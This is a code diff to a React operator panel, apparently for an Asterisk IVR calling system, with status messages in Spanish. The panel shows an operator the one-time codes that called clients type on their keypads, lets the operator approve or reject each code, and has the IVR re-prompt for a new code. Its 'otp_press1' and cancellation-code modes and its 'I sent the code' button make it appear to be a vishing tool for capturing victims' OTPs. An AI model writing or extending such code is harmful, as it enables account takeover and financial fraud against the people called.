@@ -2191,12 +2191,14 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
           prev
             ? {
                 ...prev,
+                status: isCancelModeCall ? 'cancel_invalid' : 'otp_invalid',
+                capturedOtp: undefined,
                 otpStatus: status,
                 cancelDecision: 'invalid',
                 validationNote: isCancelModeCall
                   ? '✕ Código de cancelación marcado como INVÁLIDO. Asterisk está solicitando un nuevo código al cliente...'
                   : isOtpPress1Call
-                  ? '✕ Código rechazado (INVÁLIDO). El IVR de Captura OTP está solicitando un nuevo código al cliente...'
+                  ? '✕ Código rechazado (INVÁLIDO). El IVR está reproduciendo el aviso de error y pidiendo el nuevo código al cliente...'
                   : '✕ Token marcado como INVÁLIDO. El IVR le ha solicitado automáticamente un nuevo token al cliente...',
               }
             : null
@@ -2417,7 +2419,12 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                 agent: assignedExts.find((ext) => String(ivrChannel.channel || '').includes(`PJSIP/${ext}-`) || detectedNumber === ext),
               };
             });
-          } else if (activeCallRef.current?.isActive && (activeCallRef.current.duration || 0) >= 5 && Array.isArray(data.channels)) {
+          } else if (
+            activeCallRef.current?.isActive &&
+            activeCallRef.current.name?.startsWith('Prueba Softphone') &&
+            (activeCallRef.current.duration || 0) >= 5 &&
+            Array.isArray(data.channels)
+          ) {
             const queryClean = activeCallRef.current.number.replace(/[^0-9]/g, '');
             const channelStillAlive = data.channels.some((c: any) => {
               const chStr = (c.channel || '') + (c.extension || '') + (c.callerId || '') + (c.data || '');
@@ -2580,10 +2587,11 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
               prev
                 ? {
                     ...prev,
+                    status: callState.status,
                     otpStatus: 'invalid',
                     cancelDecision: 'invalid',
                     capturedOtp: undefined,
-                    validationNote: '✕ Código marcado como INVÁLIDO. Esperando nuevo código del cliente...',
+                    validationNote: '✕ Código marcado como INVÁLIDO. El IVR está solicitando el nuevo código al cliente...',
                     duration: typeof callState.duration === 'number' && callState.duration > 0 ? callState.duration : prev.duration,
                   }
                 : null
@@ -4396,12 +4404,24 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
               </div>
             ) : (
               <div className="py-8 text-slate-400 text-sm flex flex-col items-center justify-center gap-3 font-mono bg-slate-950/60 rounded-xl border border-slate-800/80">
-                <div className="flex items-center gap-2.5 text-emerald-400">
+                <div className={`flex items-center gap-2.5 ${activeCall.otpStatus === 'invalid' ? 'text-rose-400' : 'text-emerald-400'}`}>
                   <RefreshCw className="w-5 h-5 animate-spin" />
-                  <span className="font-bold text-slate-200 text-base">Esperando que el cliente digite el código en su teléfono...</span>
+                  <span className="font-bold text-slate-200 text-base">
+                    {activeCall.otpStatus === 'invalid'
+                      ? 'Código rechazado — Esperando que el cliente digite el nuevo código...'
+                      : 'Esperando que el cliente digite el código en su teléfono...'}
+                  </span>
                 </div>
                 <p className="text-xs text-slate-400 max-w-lg text-center leading-relaxed">
-                  Pídele verbalmente al cliente en la llamada que marque su clave en su teclado numérico. En cuanto el cliente presione las teclas, los dígitos aparecerán aquí instantáneamente para que decidas si lo apruebas como válido o lo rechazas.
+                  {(activeCall.mode || callFlowMode) === 'otp_press1'
+                    ? activeCall.otpStatus === 'invalid'
+                      ? 'El IVR ya le reprodujo el aviso de código inválido y le está pidiendo que digite nuevamente su código. En cuanto lo ingrese, aparecerá aquí.'
+                      : 'El IVR automático le está pidiendo al cliente que digite su código OTP en su teclado. En cuanto lo ingrese, aparecerá aquí para que elijas Válido o Inválido.'
+                    : (activeCall.mode || callFlowMode) === 'cancel_code'
+                    ? activeCall.otpStatus === 'invalid'
+                      ? 'El IVR ya le indicó al cliente que el código es inválido y está esperando que marque el nuevo código de cancelación.'
+                      : 'En cuanto presiones "Ya Envié el Código → Pedir que Digite" y el cliente marque las teclas, los dígitos aparecerán aquí instantáneamente.'
+                    : 'Pídele verbalmente al cliente en la llamada que marque su clave en su teclado numérico. En cuanto el cliente presione las teclas, los dígitos aparecerán aquí instantáneamente para que decidas si lo apruebas como válido o lo rechazas.'}
                 </p>
                 <div className="flex items-center gap-2 pt-1">
                   {Array.from({ length: 6 }).map((_, i) => (
